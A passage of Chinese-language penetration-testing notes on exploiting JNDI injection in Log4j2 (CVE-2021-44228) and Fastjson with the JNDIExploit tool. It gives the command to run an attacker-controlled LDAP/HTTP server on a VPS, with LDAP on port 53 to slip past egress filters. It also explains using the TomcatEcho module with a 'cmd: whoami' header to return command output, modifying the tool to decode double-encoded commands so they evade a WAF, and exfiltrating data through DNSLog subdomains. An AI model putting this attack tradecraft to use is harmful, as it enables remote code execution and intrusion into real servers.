...
> **实战案例（双向引用）** → `cmd-injection-cases.md` §一 组件指纹速查表（Log4j2 `CVE-2021-44228` `${jndi:ldap://...}`；浙江移动 / 美团 `groovyInput`）+ §三不出网手法（Log4j2 借 `${sys:user.name}.xxx.dnslog.cn` **子域名外带**，Fastjson 同理）+ §四 Checklist；`attack-chain-cases.md` 案例 #6（shiro → `ldapadmin` 本地缓存域控凭据 → docker 逃逸，LDAP 凭据复用的另一形态）。
...
### JNDIExploit（0x727）— 带回显模块，实战首选

> 上面三个工具都是**盲的**（只能证明"打到了"，靠 DNSLog/反连取信）。JNDIExploit 的关键差异是**内置回显模块**，直接把命令输出返回到 HTTP 响应里。

```bash
# VPS 上启动：LDAP 挂 53、HTTP 挂 80
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i <VPS 地址> -l 53 -p 80
```

- **端口选择**：`-l 53` 把 LDAP 挂在 **53（DNS）端口**。出网策略常**放行 DNS 却封 1389**，这是最容易被漏掉的一枪；payload 写成 `ldap://<vps>:53/...` 与写 `ldap://<vps>/...` 是同一件事（默认端口即 53），关键是**服务端要听在 53**。
- **回显模块**：走 `/Basic/TomcatEcho`（Tomcat 中间件），配合请求头 **`cmd: whoami`** 把执行结果**直接回显在 HTTP 响应正文**中 —— 不必等 DNSLog，也不依赖目标反连出网。
- **二开点（WAF 对抗的配合位）**：请求头里的命令被 WAF 拦时，需改 `TomcatEcho` 源码 —— 取出 `cmd` 头后**先 hex 解码、再 base64 解码**还原命令。工具默认只吃明文，不吃双层编码。详见 `waf-bypass.md` §2.11。
- **JDK 限制**：仍受 §3 约束（≥8u191 需改返序列化 gadget）。老 fastjson（如 `1.2.39`）常伴随老 JDK，所以这条组合命中率高。

> **实战案例** → `cmd-injection-cases.md` §五·补（Fastjson 双重 `@type` 通杀 70 rank）；**命令执行被拒时的降级链** → 同文件 §三·补（`CreateProcess error=5` → 改回显模块取环境变量 / 读 `conf/context.xml`）。
